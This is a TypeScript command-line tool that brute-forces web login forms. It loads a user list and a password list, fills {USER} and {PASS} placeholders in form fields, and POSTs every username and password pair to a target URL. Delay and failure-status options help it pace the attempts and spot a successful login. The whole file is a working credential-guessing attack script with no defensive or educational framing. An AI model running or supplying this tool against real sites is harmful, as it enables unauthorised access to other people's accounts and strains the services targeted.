import { parse } from "ts-command-line-args";
import * as fs from "fs";
import * as readline from "readline";

interface Arguments {
  userFile: string; // user list file path
  passFile: string; // password file path
  target: string; // url to stomp
  formFields: string[]; // form data to send, of form key:value
  failureMessage?: string;
  failureStatus?: number;
  interval?: number;
}

export const {
  userFile,
  passFile,
  target,
  formFields,
  failureMessage,
  failureStatus,
  interval,
} = parse<Arguments>({
  userFile: { type: String, alias: "u" },
  passFile: { type: String, alias: "p" },
  target: { type: String, alias: "t" },
  formFields: { type: String, multiple: true, alias: "f" },
  failureMessage: { type: String, optional: true, alias: "m" },
  failureStatus: { type: Number, optional: true, alias: "s" },
  interval: { type: Number, optional: true, alias: "i" },
});

type Meta = {
  users: string[];
  passwords: string[];
};

type FormObject = {
  key: string;
  value: string;
};

type Result = {
  status: number;
  statusText: string;
  json: string;
};

const meta: Meta = {
  users: [],
  passwords: [],
};

async function processLineByLine(fileName: string, arrayRef: string[]) {
  const fileStream = fs.createReadStream(fileName);

  const rl = readline.createInterface({
    input: fileStream,
    crlfDelay: Infinity,
  });
  // Note: we use the crlfDelay option to recognize all instances of CR LF
  // ('\r\n') in input.txt as a single line break.

  for await (const line of rl) {
    // Each line in input.txt will be successively available here as `line`.
    if (line !== "") {
      arrayRef.push(line);
    }
  }
}

await processLineByLine(userFile, meta.users);
await processLineByLine(passFile, meta.passwords);

// Convert formFields to keyValue pairs
const getFormObject = (formField: string): FormObject => {
  const [key, value] = formField.split(":");
  return { key, value };
};

const formObjects = formFields.map((formField) => getFormObject(formField));

const sleep = async (ms: number) => {
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
};

const promisify = <V>(value: V): Promise<V> => {
  return new Promise((resolve) => resolve(value));
};

const post = async (
  target: string,
  formObjects: FormObject[],
  timeout?: number
): Promise<Result> => {
  const data = new URLSearchParams();

  formObjects.forEach((formObject) => {
    const { key, value } = formObject;
    data.append(key, value);
  });

  if (timeout) {
    await sleep(timeout);
  }

  return fetch(target, {
    method: "POST", // *GET, POST, PUT, DELETE, etc.
    mode: "cors", // no-cors, *cors, same-origin
    cache: "no-cache", // *default, no-cache, reload, force-cache, only-if-cached
    credentials: "omit", // include, *same-origin, omit
    headers: {
      // "Content-Type": "application/json",
      "Content-Type": "application/x-www-form-urlencoded",
    },
    redirect: "follow", // manual, *follow, error
    referrerPolicy: "no-referrer", // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
    body: data, // body data type must match "Content-Type" header
  })
    .then((response) => {
      const { status, statusText } = response;
      return Promise.all([
        promisify(status),
        promisify(statusText),
        response.json(),
      ]);
    })
    .then((promises) => {
      const [status, statusText, json] = promises;
      console.log({ status, statusText, json });
      return { status, statusText, json } as Result;
    });
};

const { users, passwords } = meta;

console.log(users, passwords);

// Create form object
const forms = users.flatMap((user) => {
  return passwords.map((password) => {
    return formObjects.map((formObject) => {
      const newForm = { ...formObject };
      newForm.value = formObject.value
        .replace("{USER}", user)
        .replace("{PASS}", password);
      return newForm;
    });
  });
});

const formPromises = forms.map((form, i) => {
  const timeout = interval ? i * interval : undefined;
  return post(target, form, timeout).catch((e) => console.log(e));
});

// TODO: Retry attempts that fail?

// users.forEach((user) => {
//   passwords.forEach((password) => {
//     const replacedFormObjects = formObjects.map((formObject) => {
//       formObject.value = formObject.value
//         .replace("{USER}", user)
//         .replace("{PASS}", password);

//       return formObject;
//     });
//     // console.log(replacedFormObjects);
//     promises
//       .push(post(target, replacedFormObjects))
//       .then((result) => {
//         const { status, statusText, json } = result;
//         if (failureStatus) {
//           if (status !== failureStatus) {
//             console.log("success");
//             console.log({ status, statusText, json });
//           }
//         }
//         // console.log({ status, statusText, json });
//       })
//       .catch((e) => console.log(e));
//   });
// });
